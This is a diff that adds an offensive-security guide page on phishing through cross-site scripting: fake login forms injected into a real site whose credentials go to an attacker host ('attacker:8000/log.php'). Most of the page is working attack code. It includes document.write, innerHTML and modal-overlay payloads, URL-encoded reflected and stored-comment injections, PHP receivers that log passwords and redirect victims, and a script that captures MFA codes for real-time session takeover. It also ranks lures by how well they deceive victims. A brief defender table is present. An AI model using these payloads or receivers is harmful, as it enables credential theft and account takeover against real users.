@@ -1,0 +1,440 @@
+---
+title: Phishing Injection
+description: Injecting fake login forms via XSS to harvest credentials directly from the target page - the operator advantage over external phishing is that the form lives on the real domain with the real TLS certificate, so users have no URL-bar warning to ignore. document.write delivery, removing the original page elements, the PHP credential receiver with redirect-back-to-original, and the persistence-vs-stealth tradeoff between stored and reflected variants.
+mitre: [T1566.002, T1059.007, T1185, T1078]
+d3fend: [D3-CBV]
+impact: [CredentialTheft, AccountTakeover]
+owasp: [A03, A07]
+sidebar:
+  order: 6
+  label: Phishing injection
+---
+
+## TL;DR
+
+Inject a fake login form via XSS. The form submits credentials to attacker-controlled infrastructure, then redirects the victim back to the legitimate page so they think the login was real. The advantage over standard phishing: the form lives on the target's actual domain, so users see the legitimate URL, legitimate TLS certificate, and legitimate site styling - none of the cues that defeat ordinary phishing apply.
+
+```
+# 1. Confirm an XSS exists on a page users actually visit
+# 2. Build an HTML form that POSTs to your collection endpoint
+<form action="http://attacker:8000/log.php" method="POST">
+  <input name="username" placeholder="Username">
+  <input name="password" type="password" placeholder="Password">
+  <button>Sign In</button>
+</form>
+
+# 3. Deliver via XSS - document.write or innerHTML injection
+<script>document.write('<form action=http://attacker:8000/log.php method=POST>...</form>');</script>
+
+# 4. Optional: remove the original page elements that would confuse the victim
+document.getElementById('original-form').remove();
+
+# 5. On the attacker side, log credentials and redirect back to original
+<?php
+file_put_contents("creds.txt", "$_POST[username]:$_POST[password]\n", FILE_APPEND);
+header("Location: http://target/");
+?>
+```
+
+Success indicator: credentials appear in `creds.txt` on the attacker host; victim's browser returns to the legitimate page; victim has no awareness anything unusual happened.
+
+## Why this beats traditional phishing
+
+The standard phishing defense ladder:
+
+| Defense | Defeats traditional phishing | Defeats XSS phishing |
+| --- | --- | --- |
+| Don't click links in emails | Yes | No - victim is already on the real site |
+| Check the URL bar before typing credentials | Yes | No - URL bar shows the real domain |
+| Check the TLS padlock | Yes | No - real TLS cert, real domain |
+| Browser anti-phishing blocklist (Safe Browsing) | Yes | No - real site isn't blocklisted |
+| Password manager won't autofill on wrong domain | Yes | **Sometimes no** - autofill happens on the real domain |
+| Trained user notices subtle visual differences | Yes | Often no - your injected form can match the real form's CSS pixel-for-pixel |
+
+XSS phishing bypasses every URL-based defense because the attack *is* served from the legitimate URL. The only defenses that work are those that look at the page's content, not its origin: anomaly detection (form going to unexpected destination), DOM monitoring (new form appeared on page), or behavioral signals (login from new IP triggering MFA).
+
+The password-manager-autofill point deserves emphasis: if the victim's password manager autofills `target.com` credentials into a form on `target.com`, it doesn't matter that the form is attacker-controlled - the autofill happens before the manager could detect the form's malicious destination. This is the operator's strongest single advantage.
+
+## The minimal phishing form
+
+```html
+<h3>Session expired - please log in to continue</h3>
+<form action="http://attacker:8000/log.php" method="POST">
+  <input type="text" name="username" placeholder="Username" required>
+  <input type="password" name="password" placeholder="Password" required>
+  <button type="submit">Sign In</button>
+</form>
+```
+
+Three elements:
+
+1. **A pretext** - "Session expired," "Confirm your password," "Re-authenticate to view this content." Gives the victim a reason to type their credentials again.
+2. **The form fields** - username + password at minimum. Add MFA-code field for 2FA-protected accounts.
+3. **Action URL** - attacker-controlled endpoint that will log the submission.
+
+The pretext quality determines conversion. A bare "Username / Password" form gets fewer fills than one with a believable explanation. Match the target site's existing style and language conventions.
+
+### Matching target styling
+
+For maximum believability, copy the legitimate form's CSS:
+
+1. Open the target's actual login page in DevTools
+2. Inspect the form element → "Copy outerHTML"
+3. Strip the action URL, replace with your collection endpoint
+4. Embed the result in your XSS payload
+
+The injected form is now visually indistinguishable from the legitimate one - same fonts, same spacing, same button style, same input borders.
+
+```html
+<!-- Copied from target's real login form, action URL changed -->
+<form class="login-form" action="http://attacker:8000/log.php" method="POST">
+  <label class="form-label">Email or username</label>
+  <input class="form-input" type="text" name="username" autocomplete="username">
+  <label class="form-label">Password</label>
+  <input class="form-input" type="password" name="password" autocomplete="current-password">
+  <button class="btn btn-primary btn-block">Sign in</button>
+</form>
+```
+
+The `autocomplete="username"` / `autocomplete="current-password"` attributes are critical - they trigger password manager autofill. Match the legitimate form's autocomplete attributes verbatim.
+
+## Delivery via XSS
+
+### Pattern 1 - `document.write` (replaces entire page)
+
+```html
+<script>
+  document.write(`
+    <h3>Please sign in to continue</h3>
+    <form action="http://attacker:8000/log.php" method="POST">
+      <input name="username" placeholder="Username">
+      <input name="password" type="password" placeholder="Password">
+      <button>Sign In</button>
+    </form>
+  `);
+</script>
+```
+
+`document.write` after the page has loaded wipes the current document and replaces it with the new content. Heavy-handed but bulletproof - no traces of the original page remain.
+
+Drawback: looks suspicious if the surrounding page (header, navigation) is also wiped. Best when the XSS context allows for full-page hijack - e.g., the payload runs early in `<head>` before the rest of the page renders.
+
+### Pattern 2 - `innerHTML` injection (targeted replacement)
+
+```html
+<script>
+  document.body.innerHTML = `
+    <div style="max-width: 400px; margin: 100px auto; font-family: sans-serif;">
+      <h3>Session expired</h3>
+      <p>Please sign in to continue.</p>
+      <form action="http://attacker:8000/log.php" method="POST">
+        <input name="username" placeholder="Username" style="width:100%;padding:8px;margin:4px 0;">
+        <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:4px 0;">
+        <button style="width:100%;padding:10px;">Sign In</button>
+      </form>
+    </div>
+  `;
+</script>
+```
+
+Replaces the body but preserves the page's other parts (head metadata, scripts). Less destructive than `document.write`.
+
+### Pattern 3 - Append to existing layout (most subtle)
+
+```html
+<script>
+  const overlay = document.createElement('div');
+  overlay.style.cssText = `
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.5); z-index: 9999;
+    display: flex; align-items: center; justify-content: center;
+  `;
+  overlay.innerHTML = `
+    <div style="background: white; padding: 30px; border-radius: 8px; max-width: 400px;">
+      <h3>Session expired</h3>
+      <form action="http://attacker:8000/log.php" method="POST">
+        <input name="username" placeholder="Username" style="display:block;width:100%;margin:8px 0;padding:8px;">
+        <input name="password" type="password" placeholder="Password" style="display:block;width:100%;margin:8px 0;padding:8px;">
+        <button style="width:100%;padding:10px;">Sign In</button>
+      </form>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+</script>
+```
+
+Renders a modal overlay over the existing page. The page underneath is still visible (dimmed). When the victim looks past the modal, they see the legitimate site they expect.
+
+This pattern is the most convincing - it mimics the modal-based re-authentication flows many real apps use. Twitter, Google, GitHub, and most enterprise SaaS apps periodically prompt re-auth via overlay modals; users are conditioned to expect them.
+
+## Removing the original form
+
+Stored XSS often appears inside the original page content. If the original login form is visible alongside your injected one, the victim may use the legitimate form (which goes to the legitimate endpoint, not yours).
+
+Remove the original via DOM:
+
+```javascript
+// By ID
+document.getElementById('login-form').remove();
+
+// By class
+document.querySelectorAll('.login-form').forEach(el => el.remove());
+
+// By tag (last resort)
+document.querySelectorAll('form').forEach(el => el.remove());
+```
+
+Find the original form's ID/class by inspecting the legitimate page in DevTools.
+
+For the image-viewer scenario from the source doc (where the original page has an image-URL form):
+
+```html
+<script>
+  // Inject phishing form
+  document.write(`
+    <h3>Please sign in to continue</h3>
+    <form action="http://attacker:8000/log.php" method="POST">
+      <input name="username" placeholder="Username">
+      <input name="password" type="password" placeholder="Password">
+      <button>Sign In</button>
+    </form>
+  `);
+  // Remove the original URL-input form that would distract the victim
+  document.getElementById('urlform').remove();
+</script>
+```
+
+Or comment out the trailing original HTML by appending an unterminated comment after the injection:
+
+```html
+<script>document.write('<form>...</form>');</script><!--
+```
+
+The trailing `<!--` opens an HTML comment that consumes everything after the payload until the next `-->`, hiding the rest of the original page from the rendered output.
+
+## The credential receiver
+
+The form submits to your endpoint. Your endpoint needs to:
+
+1. Log the credentials
+2. Return a response that doesn't tip off the victim
+3. (Ideally) redirect the victim back to the legitimate site so they think nothing happened
+
+### Minimal PHP receiver
+
+```php
+<?php
+// log.php
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $line = sprintf("[%s] %s | %s:%s\n",
+        date('Y-m-d H:i:s'),
+        $_SERVER['REMOTE_ADDR'],
+        $_POST['username'],
+        $_POST['password']
+    );
+    file_put_contents("creds.txt", $line, FILE_APPEND);
+    // Redirect victim to legitimate login page
+    header("Location: http://target/login");
+    exit();
+}
+http_response_code(404);
+?>
+```
+
+Run with the PHP built-in server:
+
+```shell
+$ mkdir /tmp/phish && cd /tmp/phish
+$ cat > log.php <<'EOF'
+<?php
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    file_put_contents("creds.txt",
+        sprintf("[%s] %s:%s\n", date('c'), $_POST['username'], $_POST['password']),
+        FILE_APPEND);
+    header("Location: http://target/login");
+    exit();
+}
+?>
+EOF
+$ sudo php -S 0.0.0.0:8000
+[Mon Oct 24 14:23:00 2024] PHP 8.1.0 Development Server (http://0.0.0.0:8000) started
+```
+
+Watch `creds.txt`:
+
+```shell
+$ tail -f creds.txt
+[2024-10-24T14:25:13+00:00] alice:Summer2024!
+[2024-10-24T14:31:42+00:00] bob:bobpass123
+[2024-10-24T14:48:09+00:00] admin:adminPassw0rd
+```
+
+### Why the redirect matters
+
+Without the redirect-back, the victim's browser shows `attacker:8000/log.php` in the URL bar after submission. The empty response or 404 page tips them off that something is wrong, potentially leading to a password reset on the legitimate account.
+
+With the redirect, the victim's browser returns to `target/login`. They see the legitimate site again. They may believe their login worked (especially if the legitimate site itself shows a login form). Some users will retry their credentials on the legitimate form - completely successful operation, two captures, victim oblivious.
+
+For the strongest version, redirect to a URL that looks like a *successful* state - the user's profile page, the dashboard, etc. - to reinforce the belief that login worked:
+
+```php
+header("Location: http://target/dashboard");
+```
+
+The victim sees their actual dashboard (their existing session cookie is still valid) and assumes the "re-auth" went through.
+
+### Reflective receiver - for stealthier traffic
+
+A receiver that proxies the credentials *through* to the legitimate login endpoint and returns the legitimate response:
+
+```php
+<?php
+// log.php - proxy variant
+file_put_contents("creds.txt",
+    sprintf("[%s] %s:%s\n", date('c'), $_POST['username'], $_POST['password']),
+    FILE_APPEND);
+
+// Forward to real login
+$ch = curl_init("http://target/login");
+curl_setopt_array($ch, [
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => http_build_query($_POST),
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_HEADER => true,
+]);
+$response = curl_exec($ch);
+echo $response;  // mirror upstream response back to victim
+?>
+```
+
+The victim's login actually works - their browser receives the legitimate site's set-cookie headers, they're logged in normally. The credential capture is invisible because the user-visible behavior is exactly the legitimate flow.
+
+This is the "MitM phishing" variant. More powerful, more code to write, more likely to break when the upstream login flow changes (CSRF tokens, captchas, MFA challenges).
+
+## End-to-end delivery - reflected vector
+
+For reflected XSS in a vulnerable URL parameter:
+
+```
+http://target/search?q=
+   '><script>document.write('<form action=http://attacker:8000/log.php method=POST>
+   <input name=username placeholder=Username>
+   <input name=password type=password placeholder=Password>
+   <button>Login</button></form>');document.getElementById('urlform').remove();</script>
+```
+
+URL-encoded:
+
+```
+http://target/search?q=%27%3E%3Cscript%3Edocument.write%28%27%3Cform%20action%3Dhttp%3A%2F%2Fattacker%3A8000%2Flog.php%20method%3DPOST%3E%3Cinput%20name%3Dusername%20placeholder%3DUsername%3E%3Cinput%20name%3Dpassword%20type%3Dpassword%20placeholder%3DPassword%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E
+```
+
+The full URL gets sent to victims via social engineering - email, Slack, Discord, SMS - pretending to be a legitimate link. When clicked, the victim lands on the real target site with the phishing form rendered.
+
+For social-engineering-amplified delivery, shorten via bit.ly or wrap inside an apparently-legitimate redirect.
+
+## End-to-end delivery - stored vector
+
+For stored XSS in a comment / profile bio / support ticket field, post once and every viewer triggers the payload:
+
+```
+Comment field:
+"><script>
+  const o = document.createElement('div');
+  o.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
+  o.innerHTML = '<div style="background:white;padding:30px;border-radius:8px"><h3>Session expired</h3><form action="http://attacker:8000/log.php" method="POST"><input name="username" placeholder="Username" style="display:block;margin:8px 0;padding:8px;width:300px"><input name="password" type="password" placeholder="Password" style="display:block;margin:8px 0;padding:8px;width:300px"><button>Sign In</button></form></div>';
+  document.body.appendChild(o);
+</script>
+```
+
+Once stored, every visitor sees the overlay modal. Mass credential capture from a single injection.
+
+## MFA-protected accounts
+
+For 2FA-protected accounts, the form needs to also capture the MFA code:
+
+```html
+<form action="http://attacker:8000/log.php" method="POST">
+  <input name="username" placeholder="Username">
+  <input name="password" type="password" placeholder="Password">
+  <input name="mfa_code" placeholder="2FA code">
+  <button>Sign In</button>
+</form>
+```
+
+The MFA code has a short window (usually 30 seconds for TOTP). The attacker needs to immediately use the captured credentials before the code expires. Automating this - receiver script that immediately POSTs the captured credentials + MFA code to the legitimate login endpoint and saves the resulting session cookie - turns the phish into a real-time session-takeover.
+
+```php
+<?php
+// log.php - real-time MFA-aware variant
+$capture = ['username' => $_POST['username'], 'password' => $_POST['password'],
+            'mfa_code' => $_POST['mfa_code']];
+file_put_contents("creds.txt", json_encode($capture) . "\n", FILE_APPEND);
+
+// Immediately authenticate with captured credentials
+$ch = curl_init("http://target/login");
+curl_setopt_array($ch, [
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => http_build_query($capture),
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_HEADER => true,
+    CURLOPT_COOKIEJAR => "/tmp/session.txt",
+]);
+$response = curl_exec($ch);
+file_put_contents("captured_session.txt", $response, FILE_APPEND);
+
+header("Location: http://target/dashboard");
+?>
+```
+
+The captured session cookie is saved to `/tmp/session.txt` for the attacker to use immediately. The MFA window doesn't matter because the legitimate login happens within seconds of the capture.
+
+For push-based MFA (Duo, Microsoft Authenticator approve-prompts), the picture is different - the victim has to approve the push, which they may decline if they didn't trigger it. Volume is the only counter: hit at a time when re-auth is plausible (Monday morning, immediately after a known maintenance window).
+
+## Phishing realism - what makes victims fill the form
+
+| Lure | Effectiveness |
+| --- | --- |
+| "Session expired - please re-authenticate" | High; users see this often, expect it |
+| "Confirm your password to view this content" | High; mimics sensitive-content guards |
+| "New device sign-in detected - verify it's you" | Medium-high; mimics security-aware features |
+| "Please enable 2FA - sign in to continue" | Medium; some users skip |
+| "Subscribe to view this content" | Low; users abandon |
+| Generic "Login required" with no context | Lowest; users get suspicious |
+
+The lure should match a real reauth flow the target's users have seen before. If the legitimate site uses session-timeout modals, mimic that pattern. If it shows "verify your identity" challenges, mimic that. The closer the imitation to a real flow, the higher the fill rate.
+
+## Detection by defenders
+
+| Detection mechanism | What it sees |
+| --- | --- |
+| Subresource Integrity (SRI) checks | Doesn't help - phishing form isn't a script, it's HTML |
+| CSP `form-action 'self'` | **Blocks the attack** - form's external action URL is rejected |
+| DOM mutation observers | New form elements appearing - flaggable signal |
+| Outbound POST to non-origin URL | Network-level detection - POST going to `attacker.com` instead of `self` |
+| Browser anti-phishing | Doesn't fire - legit URL bar |
+| Password manager domain check | Doesn't fire if domain matches - autofill happens |
+| User awareness training | Variable - depends on whether user inspects form action URL |
+
+The strongest defense is `Content-Security-Policy: form-action 'self'` - it blocks form submissions to any origin other than the current. If the target deploys it correctly, this attack class fails entirely. Most sites don't.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Minimal phishing form | `<form action="http://attacker:8000/log.php" method=POST><input name=username><input name=password type=password><button>Login</button></form>` |
+| Deliver via document.write | `<script>document.write('<form>...</form>');</script>` |
+| Deliver via innerHTML | `<script>document.body.innerHTML = '<form>...</form>';</script>` |
+| Deliver via overlay modal | createElement + appendChild + fixed-position div |
+| Remove original form | `document.getElementById('original-form-id').remove()` |
+| Match real form's CSS | DevTools → copy outerHTML from legitimate page → change action URL |
+| Trigger password autofill | `autocomplete="username"` / `autocomplete="current-password"` |
+| PHP cred receiver | `file_put_contents("creds.txt", ..., FILE_APPEND); header("Location: target/")` |
+| Realistic redirect target | `target/dashboard` (looks like login succeeded) |
+| MFA-aware capture | Add `<input name="mfa_code">` to form; receiver immediately POSTs to real login |
+| Run PHP server | `sudo php -S 0.0.0.0:8000` |
+| CSP that blocks this | `Content-Security-Policy: form-action 'self'` |
+| When to use overlay vs full-page | Overlay = subtler; full-page = needs less CSS work |
+| Best lures | "Session expired", "Confirm password", "Verify it's you" |
+
+For the upstream XSS that delivers the phishing payload, see [Reflected](/codex/web/xss/reflected/), [Stored](/codex/web/xss/stored/), [DOM-based](/codex/web/xss/dom-based/). For the related session-theft path that's quieter than phishing (no user interaction needed), see [XSS to session](/codex/web/sessions/xss-to-session/). For the loud impact pattern, see [Defacement](/codex/web/xss/defacement/).
